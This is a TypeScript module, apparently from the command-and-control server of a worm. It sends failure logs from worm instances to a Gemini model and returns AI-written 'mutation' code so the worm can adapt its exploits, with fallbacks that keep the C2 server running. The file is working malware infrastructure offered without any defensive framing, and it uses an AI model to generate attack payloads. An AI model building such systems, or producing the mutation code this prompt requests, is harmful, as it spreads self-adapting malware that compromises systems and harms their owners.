import { GoogleGenAI } from '@google/genai';
import { logger } from '../utils';
import fs from 'fs/promises';
import path from 'path';
// Fix: Corrected import path for ErrorLog to point to types/index.ts
import { ErrorLog } from '../../types/index';

/**
 * Generates an adaptive code mutation by sending a detailed prompt and a failure
 * log to the Gemini API.
 * @param failureLog The specific error log reported by a worm instance.
 * @returns A string containing the AI-generated mutation code, or a fallback on error.
 */
export const generateMutation = async (failureLog: ErrorLog): Promise<string | null> => {
    logger.info('[AI Engine]: Generating adaptive mutation based on failure log...');
    
    if (!process.env.API_KEY) {
        logger.error('[AI Engine]: API_KEY environment variable is not set. Cannot generate mutation.');
        // Fallback to a simple mutation to avoid crashing the C2 server
        return `({ exploit: { getLastError: () => ({ type: 'ai_fallback', details: 'AI engine offline. API_KEY not set.' }) } })`;
    }

    try {
        const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });

        // 1. Read the master prompt file from the project root
        const promptTemplatePath = path.join(__dirname, '../../prompt.txt');
        const promptTemplate = await fs.readFile(promptTemplatePath, 'utf-8');

        // 2. Inject the specific failure log into the prompt template
        const finalPrompt = promptTemplate.replace(
            '[FAILURE_LOG_JSON]',
            JSON.stringify(failureLog, null, 2)
        );

        // 3. Call the Gemini API to generate the code
        const response = await ai.models.generateContent({
            model: 'gemini-2.5-pro', // Use a powerful model for code generation
            contents: finalPrompt,
        });
        
        const generatedCode = response.text;

        if (!generatedCode) {
            throw new Error('AI returned an empty response.');
        }

        logger.info(`[AI Engine]: Successfully generated new mutation payload.`);
        
        // A basic validation to ensure the AI's response is in the expected IIFE format
        if (generatedCode.trim().startsWith('({') && generatedCode.trim().endsWith('})')) {
            return generatedCode;
        } else {
            logger.warn('[AI Engine]: AI response was not in the expected IIFE format. Attempting to wrap it.');
            // Attempt to recover by wrapping the response. This is a failsafe.
            return `(${generatedCode})`;
        }

    } catch (error: any) {
        logger.error(`[AI Engine]: Failed to generate mutation. Error: ${error.message}`);
        // Return null so the C2 server knows to handle the failure
        return null;
    }
};